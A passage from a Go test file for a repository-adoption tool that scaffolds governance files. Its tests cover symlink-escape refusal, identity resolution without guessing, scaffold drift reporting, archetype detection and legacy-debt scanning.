	missing := filepath.Join(t.TempDir(), "does", "not", "exist")
	if _, err := Adopt(context.Background(), AdoptOptions{Path: missing}); err == nil {
		t.Fatal("expected error with non-existent path")
	}
}

func TestAdopt_Negative_PathIsFileNotDir(t *testing.T) {
	file := filepath.Join(t.TempDir(), "file.txt")
	mustWrite(t, file, "x")
	if _, err := Adopt(context.Background(), AdoptOptions{Path: file}); err == nil {
		t.Fatal("expected error when path is a regular file")
	}
}

func TestAdopt_Negative_SymlinkedTargetsAreRefused(t *testing.T) {
	outside := t.TempDir()
	for _, name := range []string{"AGENTS.md", "README.md", "Makefile"} {
		repoPath := newTestRepo(t, "symlink-"+strings.ToLower(strings.TrimSuffix(name, ".md")))
		victim := filepath.Join(outside, name+".secret")
		mustWrite(t, victim, "SECRET-KEY-MATERIAL\n")
		if err := os.Symlink(victim, filepath.Join(repoPath, name)); err != nil {
			t.Skipf("symlinks unavailable: %v", err)
		}

		rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath})
		if err == nil {
			t.Fatalf("%s: expected adoption to refuse a symlink escaping the repository", name)
		}
		if rep == nil {
			t.Fatalf("%s: a failed run must still return the partial report", name)
		}
		if got := mustRead(t, victim); got != "SECRET-KEY-MATERIAL\n" {
			t.Fatalf("%s: symlink target was modified through the link:\n%s", name, got)
		}
	}
}

func TestAdopt_Negative_DanglingSymlinkIsNotCreatedThrough(t *testing.T) {
	repoPath := newTestRepo(t, "dangling")
	target := filepath.Join(t.TempDir(), "planted", "AGENTS.md")
	if err := os.Symlink(target, filepath.Join(repoPath, "AGENTS.md")); err != nil {
		t.Skipf("symlinks unavailable: %v", err)
	}
	if _, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath}); err == nil {
		t.Fatal("expected adoption to refuse a dangling symlink")
	}
	if _, err := os.Lstat(target); !errors.Is(err, os.ErrNotExist) {
		t.Fatalf("adoption must not create the symlink target, stat err=%v", err)
	}
}

func TestAdopt_Negative_PartialReportOnFailure(t *testing.T) {
	repoPath := newTestRepo(t, "partial-failure")
	mustWrite(t, filepath.Join(repoPath, "README.md"), "all:\n")
	if os.Geteuid() == 0 {
		t.Skip("root ignores file modes")
	}
	if err := os.Chmod(filepath.Join(repoPath, "README.md"), 0o000); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { restoreMode(t, filepath.Join(repoPath, "README.md")) })

	rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath})
	if err == nil {
		t.Fatal("expected an error for an unreadable README")
	}
	if rep == nil || !contains(rep.CreatedFiles, ".standards.yaml") {
		t.Fatalf("partial report must list the files written before the failure, got %+v", rep)
	}
}

func TestAdopt_Negative_UnreadableReadmeIsAnError(t *testing.T) {
	if os.Geteuid() == 0 {
		t.Skip("root ignores file modes")
	}
	repoPath := newTestRepo(t, "bad-readme")
	readme := filepath.Join(repoPath, "README.md")
	mustWrite(t, readme, "# x\n")
	if err := os.Chmod(readme, 0o000); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { restoreMode(t, readme) })

	if _, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath}); err == nil {
		t.Fatal("an existing but unreadable README.md must fail adoption, not be skipped silently")
	}
}

func TestAdopt_Negative_ScanTimeoutFailsInsteadOfEmptyBaseline(t *testing.T) {
	repoPath := newTestRepo(t, "scan-timeout")
	mustWrite(t, filepath.Join(repoPath, "main.go"), "package main\nfunc run() {\n\t_ = doSomething()\n}\n")

	ctx, cancel := context.WithCancel(context.Background())
	// Cancel right before the baseline step: the scan observes the cancelled context.
	steps := []adoptStep{func(context.Context, *adoptSession) error { cancel(); return nil }, reconcileBaseline}
	s := &adoptSession{repoPath: repoPath, repoName: "scan-timeout", arch: "framework",
		opts: AdoptOptions{Path: repoPath, RecordBaseline: true}, report: &AdoptReport{DebtBreakdown: map[string]int{}}}
	var err error
	for i := 0; i < len(steps) && i < maxAdoptSteps; i++ {
		if err = steps[i](ctx, s); err != nil {
			break
		}
	}
	if err == nil {
		t.Fatal("an interrupted scan must fail the baseline step")
	}
	if s.report.BaselineStatus != "failed" {
		t.Fatalf("interrupted scan status: %q", s.report.BaselineStatus)
	}
	if _, statErr := os.Stat(filepath.Join(repoPath, ".standards-baseline.json")); !errors.Is(statErr, os.ErrNotExist) {
		t.Fatal("no baseline may be written when the scan did not complete")
	}
}

// =========================================================================
// Boundary 3D Tests
// =========================================================================

func TestAdopt_Boundary_EmptyRepoPathDefaults(t *testing.T) {
	repoPath := newTestRepo(t, "empty")
	before := snapshotTree(t, repoPath)

	rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath, DryRun: true})
	if err != nil {
		t.Fatalf("Adopt on empty repo failed: %v", err)
	}
	assertNoIssues(t, rep)
	assertTreeUnchanged(t, before, snapshotTree(t, repoPath))
	if rep.Archetype != "template-seed" {
		t.Fatalf("expected template-seed archetype for empty dir, got: %s", rep.Archetype)
	}
	if len(rep.Facets) != 4 {
		t.Fatalf("expected 4 default facets, got: %d", len(rep.Facets))
	}
}

func TestAdopt_Boundary_EmptyPathMeansCwd(t *testing.T) {
	repoPath := newTestRepo(t, "cwd-repo")
	t.Chdir(repoPath)
	before := snapshotTree(t, repoPath)
	rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: "", DryRun: true})
	if err != nil {
		t.Fatalf("empty path must resolve to the working directory: %v", err)
	}
	assertNoIssues(t, rep)
	assertTreeUnchanged(t, before, snapshotTree(t, repoPath))
}

func TestDetectState_Boundary(t *testing.T) {
	tmpDir := t.TempDir()
	if s := DetectState(tmpDir); s != StateGreenfield {
		t.Fatalf("expected greenfield for empty dir, got: %s", s)
	}
	mustWrite(t, filepath.Join(tmpDir, "AGENTS.md"), "rules")
	if s := DetectState(tmpDir); s != StatePartial {
		t.Fatalf("expected partial for dir with only AGENTS.md, got: %s", s)
	}
	mustWrite(t, filepath.Join(tmpDir, ".standards.yaml"), "manifest")
	mustWrite(t, filepath.Join(tmpDir, ".standards.lock"), "lock")
	if s := DetectState(tmpDir); s != StatePartial {
		t.Fatalf("expected partial while the baseline is missing, got: %s", s)
	}
	mustWrite(t, filepath.Join(tmpDir, ".standards-baseline.json"), "{}")
	if s := DetectState(tmpDir); s != StateBrownfield {
		t.Fatalf("expected brownfield for dir with all files, got: %s", s)
	}
}

func TestDetectState_Negative_NonexistentPath(t *testing.T) {
	if s := DetectState(filepath.Join(t.TempDir(), "missing")); s != StateGreenfield {
		t.Fatalf("a nonexistent path has no artefacts and is greenfield, got %s", s)
	}
}

func TestResolveArchetype_Markers(t *testing.T) {
	tests := []struct {
		filename string
		expected string
	}{
		{"meson.build", "native-gpu-systems"},
		{"CMakeLists.txt", "native-gpu-systems"},
		{"Cargo.toml", "native-gpu-systems"},
		{"go.mod", "framework"},
		{"pubspec.yaml", "app-service"},
		{"pom.xml", "app-service"},
		{"build.gradle", "app-service"},
		{"build.gradle.kts", "app-service"},
		{"package.json", "app-service"},
		{"pyproject.toml", "app-service"},
		{"Dockerfile", "container-image"},
	}
	for _, tc := range tests {
		tmpDir := t.TempDir()
		mustWrite(t, filepath.Join(tmpDir, tc.filename), "dummy")
		if arch := archetypeOf(tmpDir, "", nil); arch != tc.expected {
			t.Errorf("for marker %s: expected %s, got %s", tc.filename, tc.expected, arch)
		}
	}
	// Precedence: meson beats go.mod; an explicit profile beats every marker.
	tmpDir := t.TempDir()
	mustWrite(t, filepath.Join(tmpDir, "meson.build"), "project('acme-gpu')")
	mustWrite(t, filepath.Join(tmpDir, "go.mod"), "module example.com/acme/gpu")
	if arch := archetypeOf(tmpDir, "", nil); arch != "native-gpu-systems" {
		t.Fatalf("expected native-gpu-systems for meson project, got: %s", arch)
	}
	if arch := archetypeOf(tmpDir, "custom", nil); arch != "custom" {
		t.Fatalf("explicit profile must win, got %s", arch)
	}
	if arch := archetypeOf(t.TempDir(), "", nil); arch != "template-seed" {
		t.Fatalf("no markers must yield template-seed, got %s", arch)
	}
}

// archetypeOf is the archetype resolveArchetype names, fallback included.
func archetypeOf(repoPath, explicit string, declared []string) string {
	return resolveArchetype(repoPath, explicit, declared).Or(classify.FallbackArchetype)
}

// TestResolveArchetype_DeclaredProfileOutranksMarkers pins BUG-944: the manifest's declared
// profile decides, ahead of the operator flag and every marker, and blank declarations fall
// through instead of deciding.
func TestResolveArchetype_DeclaredProfileOutranksMarkers(t *testing.T) {
	repo := t.TempDir()
	mustWrite(t, filepath.Join(repo, "go.mod"), "module example.com/acme/infra")
	// Positive: go.mod says framework, the repository says gitops-infra.
	decision := resolveArchetype(repo, "", []string{"gitops-infra", "framework"})
	if decision.Archetype != "gitops-infra" || decision.Source != classify.SourceDeclared {
		t.Fatalf("declared profile lost to markers: %+v", decision)
	}
	if arch := archetypeOf(repo, "app-service", []string{"gitops-infra"}); arch != "gitops-infra" {
		t.Fatalf("an explicit profile overrode the declared one: %s", arch)
	}
	// Boundary: blank declarations decide nothing, so markers still apply.
	if arch := archetypeOf(repo, "", []string{"", "  "}); arch != "framework" {
		t.Fatalf("blank declared profiles must fall through to markers, got %s", arch)
	}
	// Negative: a declared or explicit profile is never swapped for app-service on .NET.
	dotnet := &VerificationPlan{Runtimes: []string{"dotnet"}}
	if arch := adoptionArchetype(resolveArchetype(repo, "", []string{"gitops-infra"}), dotnet); arch != "gitops-infra" {
		t.Fatalf("dotnet detection replaced the declared profile: %s", arch)
	}
	if arch := adoptionArchetype(resolveArchetype(repo, "", nil), dotnet); arch != "app-service" {
		t.Fatalf("marker-only dotnet repository must adopt as app-service, got %s", arch)
	}
}

// TestAdopt_DeclaredProfileGovernsAdoption runs the whole chain on a repository whose
// manifest declares a profile its markers contradict.
func TestAdopt_DeclaredProfileGovernsAdoption(t *testing.T) {
	repo := newTestRepo(t, "declared-profile")
	mustWrite(t, filepath.Join(repo, "go.mod"), "module example.com/declared\n\ngo 1.27\n")
	mustWrite(t, filepath.Join(repo, manifestFile), "version: 1\nrepository:\n  owner: acme\n  name: declared-profile\n"+
		"profiles:\n  - gitops-infra\nfacets:\n  - custom:facet\n")
	report, err := Adopt(t.Context(), AdoptOptions{Path: repo, Profile: "app-service", DryRun: true, SkipGitValidation: true})
	if err != nil {
		t.Fatalf("adopt: %v", err)
	}
	if report.Archetype != "gitops-infra" {
		t.Fatalf("adoption used %s instead of the declared gitops-infra", report.Archetype)
	}
	if !strings.Contains(strings.Join(report.Warnings, "\n"), "--profile app-service ignored") {
		t.Fatalf("an overridden --profile was not reported: %v", report.Warnings)
	}
}

// writeOriginRemote gives a test repository an origin remote in its own .git/config.
func writeOriginRemote(t *testing.T, repo, url string) {
	t.Helper()
	mustWrite(t, filepath.Join(repo, ".git", "config"),
		"[core]\n\trepositoryformatversion = 0\n[remote \"origin\"]\n\turl = "+url+"\n")
}

// identitySession resolves identity for repo the way Adopt does.
// adoptionManifest builds the adoption manifest for s or fails the test.
func adoptionManifest(t *testing.T, s *adoptSession) *config.Manifest {
	t.Helper()
	manifest, _, err := newAdoptionManifest(t.Context(), s)
	if err != nil {
		t.Fatalf("build adoption manifest: %v", err)
	}
	return manifest
}

func TestResolveFacets_EmptyInputYieldsDefault(t *testing.T) {
	got := resolveFacets(nil)
	want := config.DefaultFacets()
	if !reflect.DeepEqual(got, want) {
		t.Errorf("resolveFacets(nil) = %v, want %v", got, want)
	}

	gotEmpty := resolveFacets([]string{})
	if !reflect.DeepEqual(gotEmpty, want) {
		t.Errorf("resolveFacets([]) = %v, want %v", gotEmpty, want)
	}

	provided := []string{"custom:facet"}
	gotProvided := resolveFacets(provided)
	if !reflect.DeepEqual(gotProvided, provided) {
		t.Errorf("resolveFacets(%v) = %v, want %v", provided, gotProvided, provided)
	}
}

func identitySession(t *testing.T, repo string) *adoptSession {
	t.Helper()
	s := &adoptSession{repoPath: repo, arch: "framework", facets: resolveFacets(nil), report: &AdoptReport{}}
	if err := s.resolveIdentity(t.Context()); err != nil {
		t.Fatalf("resolve identity: %v", err)
	}
	return s
}

// TestAdoptionManifest_IdentityFromRemote pins BUG-852 positive: owner and name come from the
// origin remote even when the checkout directory is named differently, and visibility, which
// adoption cannot observe, is left unset instead of declared public.
func TestAdoptionManifest_IdentityFromRemote(t *testing.T) {
	repo := newTestRepo(t, "checkout-dir")
	writeOriginRemote(t, repo, "https://github.com/acme/widget.git")
	s := identitySession(t, repo)
	manifest := adoptionManifest(t, s)
	got := manifest.Repository
	if got.Owner != "acme" || got.Name != "widget" || got.Visibility != "" {
		t.Fatalf("manifest identity = %+v, want acme/widget with visibility unset", got)
	}
	if s.repoName != "widget" || len(s.report.Warnings) != 0 {
		t.Fatalf("resolved identity must label prose with its name and warn nothing: %q %v", s.repoName, s.report.Warnings)
	}
}

// TestAdoptionManifest_UnresolvedIdentityStaysEmpty pins BUG-852 negative: with no remote and
// no <owner>/<repo> layout, adoption writes no owner, name or visibility and says why.
func TestAdoptionManifest_UnresolvedIdentityStaysEmpty(t *testing.T) {
	requireGit(t)
	repo := filepath.Join(t.TempDir(), "dev", "orphan")
	if err := os.MkdirAll(repo, 0o755); err != nil {
		t.Fatal(err)
	}
	initTestGit(t, repo)
	s := identitySession(t, repo)
	manifest := adoptionManifest(t, s)
	if got := manifest.Repository; got.Owner != "" || got.Name != "" || got.Visibility != "" {
		t.Fatalf("unresolved identity was invented: %+v", manifest.Repository)
	}
	if s.identity.coordinate() != "" || !strings.Contains(strings.Join(s.report.Warnings, "\n"), "repository identity unresolved") {
		t.Fatalf("unresolved identity was not reported: %q %v", s.identity.coordinate(), s.report.Warnings)
	}
	data, err := yaml.Marshal(manifest)
	if err != nil {
		t.Fatal(err)
	}
	for _, invented := range []string{"owner: cordanaLLM", "visibility: public", "name: orphan"} {
		if strings.Contains(string(data), invented) {
			t.Fatalf("manifest carries invented %q:\n%s", invented, data)
		}
	}
	// Boundary: the directory name still labels generated prose, and only prose.
	if s.repoName != "orphan" {
		t.Fatalf("prose label = %q, want the checkout directory name", s.repoName)
	}
}

// TestAdopt_UnresolvedIdentityCompletesWithoutGuessing runs the chain on a repository with no
// identity: it completes, writes an identity-free manifest and leaves the README's badge
// unwritten instead of linking to a guessed repository.
func TestAdopt_UnresolvedIdentityCompletesWithoutGuessing(t *testing.T) {
	requireGit(t)
	repo := filepath.Join(t.TempDir(), "dev", "orphan")
	if err := os.MkdirAll(repo, 0o755); err != nil {
		t.Fatal(err)
	}
	initTestGit(t, repo)
	readme := "# Orphan\n"
	mustWrite(t, filepath.Join(repo, readmeFile), readme)
	report, err := Adopt(t.Context(), AdoptOptions{Path: repo, SkipGitValidation: true, SkipHookActivation: true,
		LockSourceRoot: newAdoptLockSource(t)})
	if err != nil {
		t.Fatalf("adoption without an identity failed: %v", err)
	}
	manifest, err := config.LoadManifest(filepath.Join(repo, manifestFile))
	if err != nil {
		t.Fatal(err)
	}
	if got := manifest.Repository; got.Owner != "" || got.Name != "" || got.Visibility != "" {
		t.Fatalf("written manifest invents identity: %+v", got)
	}
	warnings := strings.Join(report.Warnings, "\n")
	if mustRead(t, filepath.Join(repo, readmeFile)) != readme || !strings.Contains(warnings, "Governance block not reconciled") {
		t.Fatalf("README was reconciled against no identity; warnings:\n%s", warnings)
	}
}

// TestAdoptionManifest_CheckoutLayoutIsNotIdentity pins BUG-852 for the checkout path: a
// repository at <parent>/<name> with no origin remote is unresolved. util.ResolveRepoIdentity
// would name it parent/name, which is where the checkout sits, not who owns the repository.
func TestAdoptionManifest_CheckoutLayoutIsNotIdentity(t *testing.T) {
	requireGit(t)
	repo := filepath.Join(t.TempDir(), "acme", "widget")
	if err := os.MkdirAll(repo, 0o755); err != nil {
		t.Fatal(err)
	}
	initTestGit(t, repo)
	s := identitySession(t, repo)
	manifest := adoptionManifest(t, s)
	if got := manifest.Repository; got.Owner != "" || got.Name != "" || s.identity.resolved() {
		t.Fatalf("checkout layout became identity: manifest %+v, session %+v", got, s.identity)
	}
	warnings := strings.Join(s.report.Warnings, "\n")
	for _, want := range []string{"repository identity unresolved", "praetorctl audit fails", "add an origin remote"} {
		if !strings.Contains(warnings, want) {
			t.Fatalf("unresolved-identity warning lacks %q:\n%s", want, warnings)
		}
	}
}

// TestAdopt_NoRemoteWritesNoGuessedPlatform pins BUG-852 across adoption output: a checkout
// at <parent>/<name> with no origin remote gets no Paperclip harness, so neither the old
// cordanaLLM/<name> default nor the <parent>/<name> layout reaches harness.json or rules.md,
// and no other file adoption writes names the layout as owner/name.
func TestAdopt_NoRemoteWritesNoGuessedPlatform(t *testing.T) {
	requireGit(t)
	repo := filepath.Join(t.TempDir(), "acme", "widget")
	if err := os.MkdirAll(repo, 0o755); err != nil {
		t.Fatal(err)
	}
	initTestGit(t, repo)
	mustWrite(t, filepath.Join(repo, "go.mod"), "module example.com/widget\n\ngo 1.24\n")
	opts := AdoptOptions{Path: repo, SkipGitValidation: true, SkipHookActivation: true, LockSourceRoot: newAdoptLockSource(t)}
	if _, err := Adopt(t.Context(), opts); err != nil {
		t.Fatalf("adoption failed: %v", err)
	}
	// Boundary: a re-run that still has no identity keeps writing no harness and says why.
	report, err := Adopt(t.Context(), opts)
	if err != nil {
		t.Fatalf("re-run failed: %v", err)
	}
	if fileExists(filepath.Join(repo, filepath.FromSlash(paperclipFile))) || fileExists(filepath.Join(repo, ".paperclip", "rules.md")) {
		t.Fatal("adoption without an identity wrote a Paperclip harness")
	}
	if note := findActionDetail(report.ActionDetails, paperclipFile); !strings.Contains(note, "Paperclip harness not written") {
		t.Fatalf("paperclip step does not say why it wrote nothing: %q", note)
	}
	for _, guessed := range []string{"cordanaLLM/widget", "acme/widget"} {
		if hit := findAdoptedText(t, repo, guessed); hit != "" {
			t.Fatalf("adoption wrote the guessed identity %q into %s", guessed, hit)
		}
	}
}

// findAdoptedText returns the first file adoption wrote under repo that contains text, or "".
// Git metadata and the private ledger, which record the checkout path, are not adoption output.
func findAdoptedText(t *testing.T, repo, text string) string {
	t.Helper()
	found := ""
	err := filepath.WalkDir(repo, func(path string, entry os.DirEntry, walkErr error) error {
		if walkErr != nil || found != "" {
			return walkErr
		}
		if entry.IsDir() && (entry.Name() == ".git" || entry.Name() == ".workingdir") {
			return filepath.SkipDir
		}
		if entry.Type().IsRegular() && strings.Contains(mustRead(t, path), text) {
			found = path
		}
		return nil
	})
	if err != nil {
		t.Fatal(err)
	}
	return found
}

// TestAdopt_RerunCompletesOnceIdentityIsSet pins the recovery the unresolved-identity warning
// names. Boundary: a re-run that finds the origin remote installs the checkpoint lifecycle,
// which reads that remote, and binds register.sources to the harness it now writes, but never
// rewrites the empty identity in the existing manifest, so the README block stays unreconciled. Positive: once the operator sets both fields, the
// re-run reconciles the README block from them and warns nothing about identity.
func TestAdopt_RerunCompletesOnceIdentityIsSet(t *testing.T) {
	requireGit(t)
	repo := filepath.Join(t.TempDir(), "dev", "orphan")
	if err := os.MkdirAll(repo, 0o755); err != nil {
		t.Fatal(err)
	}
	initTestGit(t, repo)
	readme := "# Orphan\n"
	mustWrite(t, filepath.Join(repo, readmeFile), readme)
	source := newAdoptLockSource(t)
	mustWrite(t, filepath.Join(source, filepath.FromSlash(checkpointScript)), "#!/usr/bin/env python3\nprint('shared')\n")
	mustWrite(t, filepath.Join(source, filepath.FromSlash(checkpointCommon)), "class HookError(Exception):\n    pass\n")
	opts := AdoptOptions{Path: repo, SkipGitValidation: true, SkipHookActivation: true, LockSourceRoot: source}
	first, err := Adopt(t.Context(), opts)
	if err != nil {
		t.Fatalf("first adoption failed: %v", err)
	}
	if fileExists(filepath.Join(repo, filepath.FromSlash(checkpointPolicy))) ||
		mustRead(t, filepath.Join(repo, readmeFile)) != readme {
		t.Fatal("first adoption without an identity installed the checkpoint policy or the README block")
	}
	if fileExists(filepath.Join(repo, filepath.FromSlash(paperclipFile))) ||
		!strings.Contains(findActionDetail(first.ActionDetails, paperclipFile), "Paperclip harness not written") {
		t.Fatalf("first adoption without an identity wrote a harness or did not say why not: %q",
			findActionDetail(first.ActionDetails, paperclipFile))
	}
	manifestPath := filepath.Join(repo, manifestFile)
	firstManifest := mustRead(t, manifestPath)
	writeOriginRemote(t, repo, "git@github.com:acme/orphan.git")
	if _, err := Adopt(t.Context(), opts); err != nil {
		t.Fatalf("re-run with a remote failed: %v", err)
	}
	// The re-run writes the harness, so it binds register.sources to it; the identity the
	// operator has to set stays empty.
	rerun, err := config.LoadManifest(manifestPath)
	if err != nil || rerun.Repository.Owner != "" || rerun.Repository.Name != "" ||
		rerun.Register == nil || rerun.Register.Sources == nil {
		t.Fatalf("re-run must keep the empty identity and only add register.sources: %+v %v\n%s",
			rerun, err, mustRead(t, manifestPath))
	}
	if got := mustRead(t, manifestPath); !strings.HasPrefix(got, firstManifest) {
		t.Fatalf("re-run rewrote the lines of the existing manifest:\n%s", got)
	}
	policy := mustRead(t, filepath.Join(repo, filepath.FromSlash(checkpointPolicy)))
	if !strings.Contains(policy, `"repository": "acme/orphan"`) {
		t.Fatalf("re-run checkpoint policy does not name the remote identity:\n%s", policy)
	}
	if mustRead(t, filepath.Join(repo, readmeFile)) != readme {
		t.Fatal("README block was reconciled against a manifest that names no identity")
	}
	harness := mustRead(t, filepath.Join(repo, filepath.FromSlash(paperclipFile)))
	rules := mustRead(t, filepath.Join(repo, ".paperclip", "rules.md"))
	if !strings.Contains(harness, `"platform": "acme/orphan"`) || !strings.HasPrefix(rules, "# Paperclip Operating Rules (acme/orphan)\n") {
		t.Fatalf("re-run harness does not name the remote identity:\n%s\n%s", harness, rules)
	}
	handSet := strings.NewReplacer(`owner: ""`, "owner: acme", `name: ""`, "name: orphan").Replace(firstManifest)
	mustWrite(t, manifestPath, handSet)
	manifest, err := config.LoadManifest(manifestPath)
	if err != nil || manifest.Repository.Owner != "acme" || manifest.Repository.Name != "orphan" {
		t.Fatalf("hand-set identity fixture did not parse as acme/orphan: %+v %v", manifest, err)
	}
	report, err := Adopt(t.Context(), opts)
	if err != nil {
		t.Fatalf("re-run with a hand-set identity failed: %v", err)
	}
	if strings.Contains(strings.Join(report.Warnings, "\n"), "repository identity unresolved") {
		t.Fatalf("resolved re-run still warns: %v", report.Warnings)
	}
	if !strings.Contains(mustRead(t, filepath.Join(repo, readmeFile)), "praetor:readme-governance:start") {
		t.Fatal("re-run left the README governance block unreconciled after the identity was set")
	}
}

// TestAdopt_UnparsableManifestFailsWithoutRewrite pins BUG-853 for the manifest: an existing
// manifest the config loader rejects fails adoption and stays byte for byte.
func TestAdopt_UnparsableManifestFailsWithoutRewrite(t *testing.T) {
	repo := newTestRepo(t, "broken-manifest")
	broken := "version: 1\nprofiles: [framework\nfacets: {\n"
	mustWrite(t, filepath.Join(repo, manifestFile), broken)
	report, err := Adopt(t.Context(), AdoptOptions{Path: repo, SkipGitValidation: true})
	if err == nil {
		t.Fatal("adoption accepted an unparsable manifest")
	}
	for _, detail := range report.ActionDetails {
		if detail.Path == manifestFile {
			t.Fatalf("unparsable manifest was reported as %s: %s", detail.Action, detail.Details)
		}
	}
	if got := mustRead(t, filepath.Join(repo, manifestFile)); got != broken {
		t.Fatalf("unparsable manifest was rewritten:\n%s", got)
	}
}

// TestScaffoldFile_ReportsDriftInsteadOfVerified pins BUG-853 for scaffolds: an existing file
// is verified only when it matches, drift is reported and preserved, and a CRLF checkout of
// the same text is still a match.
func TestScaffoldFile_ReportsDriftInsteadOfVerified(t *testing.T) {
	repo := t.TempDir()
	s := &adoptSession{repoPath: repo, report: &AdoptReport{}}
	sc := scaffold{rel: evasionHookFile, perm: filePerm, content: []byte("import sys\nsys.exit(2)\n"), auditLocked: true,
		created: "created", verified: "verified"}
	path := filepath.Join(repo, filepath.FromSlash(evasionHookFile))
	cases := []struct {
		name, existing string
		want           scaffoldState
		detail         string
	}{
		{"identical", "import sys\nsys.exit(2)\n", scaffoldIdentical, "verified"},
		{"crlf checkout", "import sys\r\nsys.exit(2)\r\n", scaffoldIdentical, "verified"},
		{"no-op interceptor", "import sys\nsys.exit(0)\n", scaffoldDrifted, "differs from the scaffold"},
		{"empty", "", scaffoldDrifted, "differs from the scaffold"},
	}
	for _, tc := range cases {
		mustWrite(t, path, tc.existing)
		s.report = &AdoptReport{}
		state, err := s.scaffoldFile(t.Context(), sc)
		if err != nil || state != tc.want {
			t.Fatalf("%s: state=%v err=%v, want %v", tc.name, state, err, tc.want)
		}
		last := s.report.ActionDetails[len(s.report.ActionDetails)-1]
		if !strings.Contains(last.Details, tc.detail) || mustRead(t, path) != tc.existing {
			t.Fatalf("%s: detail %q or content changed", tc.name, last.Details)
		}
		if drifted := tc.want == scaffoldDrifted; drifted != (len(s.report.Warnings) == 1) {
			t.Fatalf("%s: drift warning mismatch: %v", tc.name, s.report.Warnings)
		}
	}
	// --force still regenerates a drifted scaffold that allows it.
	s.opts.Force = true
	if state, err := s.scaffoldFile(t.Context(), sc); err != nil || state != scaffoldWritten ||
		mustRead(t, path) != string(sc.content) {
		t.Fatalf("--force did not regenerate the drifted scaffold: %v %v", state, err)
	}
}

// TestAdopt_DriftedLefthookIsNotVerified runs the chain over a repository whose lefthook.yml
// and contributor guide were edited: both stay, and neither is reported as verified present.
func TestAdopt_DriftedLefthookIsNotVerified(t *testing.T) {
	repo := newTestRepo(t, "drifted-scaffolds")
	custom := map[string]string{lefthookFile: "pre-commit:\n  jobs: []\n", contributingFile: "# Our own guide\n"}
	for rel, body := range custom {
		mustWrite(t, filepath.Join(repo, rel), body)
	}
	report, err := Adopt(t.Context(), AdoptOptions{Path: repo, DryRun: true, SkipGitValidation: true})
	if err != nil {
		t.Fatalf("adopt: %v", err)
	}
	for rel, body := range custom {
		if mustRead(t, filepath.Join(repo, rel)) != body {
			t.Fatalf("%s was rewritten", rel)
		}
		detail := findActionDetail(report.ActionDetails, rel)
		if strings.Contains(detail, "verified present") || !strings.Contains(detail, "differs from the scaffold") {
			t.Fatalf("%s reported as %q", rel, detail)
		}
	}
}

// findActionDetail returns the details of the last action recorded for path.
func findActionDetail(details []ActionDetail, path string) string {
	found := ""
	for _, detail := range details {
		if detail.Path == path {
			found = detail.Details
		}
	}
	return found
}

func TestAdopt_MultiLanguageLegacyDebt(t *testing.T) {
	repoPath := newTestRepo(t, "polyglot")
	mustWrite(t, filepath.Join(repoPath, "kernel.c"), "#include <stdio.h>\nvoid test() {\n    while (1) {}\n    strcpy(dst, src);\n}\n")
	mustWrite(t, filepath.Join(repoPath, "script.py"), "while True:\n    try:\n        pass\n    except:\n        pass\n")
	mustWrite(t, filepath.Join(repoPath, "lib.rs"), "fn main() {\n    let val = Some(1).unwrap();\n}\n")

	before := snapshotTree(t, repoPath)
	rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath, Profile: "native-gpu-systems", RecordBaseline: true, DryRun: true})
	if err != nil {
		t.Fatalf("Adopt failed: %v", err)
	}
	assertNoIssues(t, rep)
	assertTreeUnchanged(t, before, snapshotTree(t, repoPath))
	if rep.LegacyDebtCount < 5 {
		t.Fatalf("expected at least 5 legacy infractions across C, Python, and Rust, got: %d", rep.LegacyDebtCount)
	}
	for _, rule := range []string{"HISS-02", "HISS-07", "HISS-08"} {
		if rep.DebtBreakdown[rule] == 0 {
			t.Errorf("expected %s infractions, got none", rule)
		}
	}
}

func TestAdopt_NASARule4_FunctionLengthLimit(t *testing.T) {
	repoPath := newTestRepo(t, "long-funcs")
	var cCode, pyCode strings.Builder
	cCode.WriteString("void long_c_function() {\n")
	pyCode.WriteString("def long_python_function():\n")
	for i := 0; i < 70; i++ {
		cCode.WriteString("    int x = 1;\n")
		pyCode.WriteString("    x = 1\n")
	}
	cCode.WriteString("}\n")
	mustWrite(t, filepath.Join(repoPath, "long.c"), cCode.String())
	mustWrite(t, filepath.Join(repoPath, "long.py"), pyCode.String())

	before := snapshotTree(t, repoPath)
	rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath, Profile: "framework", RecordBaseline: true, DryRun: true})
	if err != nil {
		t.Fatalf("Adopt failed: %v", err)
	}
	assertTreeUnchanged(t, before, snapshotTree(t, repoPath))
	if rep.DebtBreakdown["HISS-04"] < 2 {
		t.Errorf("expected at least 2 HISS-04 infractions for functions > 60 LOC, got: %d", rep.DebtBreakdown["HISS-04"])
	}
}

// =========================================================================
// AGENTS.md merge behaviour
// =========================================================================

func TestAdopt_ExistingAgentsMDMerged(t *testing.T) {
	repoPath := newTestRepo(t, "merge-agents")
	custom := "# Custom Project Guidelines\n- Rule 1: Always check tests\n- Rule 2: Keep commits clean\n"
	mustWrite(t, filepath.Join(repoPath, "AGENTS.md"), custom)

	rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath, Profile: "framework"})
	if err != nil {
		t.Fatalf("Adopt failed: %v", err)
	}
	assertNoIssues(t, rep)
	content := mustRead(t, filepath.Join(repoPath, "AGENTS.md"))
	for _, want := range []string{"Agent Operating Harness", "## Core Directives & Invariants", "# Custom Project Guidelines", harnessEndMarker} {
		if !strings.Contains(content, want) {
			t.Errorf("expected merged AGENTS.md to contain %q", want)
		}
	}
	if !hasAction(rep, "AGENTS.md", actionMerge) {
		t.Errorf("expected a merge action for AGENTS.md, got %v", rep.ActionDetails)
	}
}

func TestAdopt_AgentsMD_ForcePreservesCustomInstructions(t *testing.T) {
	cases := map[string]string{
		"legacy-separator":           "<!-- markdownlint-disable -->\n# old Agent Operating Harness\n\n## Core Directives & Invariants\nold table\n\n---\n\n# Custom Repo Instructions\nDon't touch this proprietary text!\n",
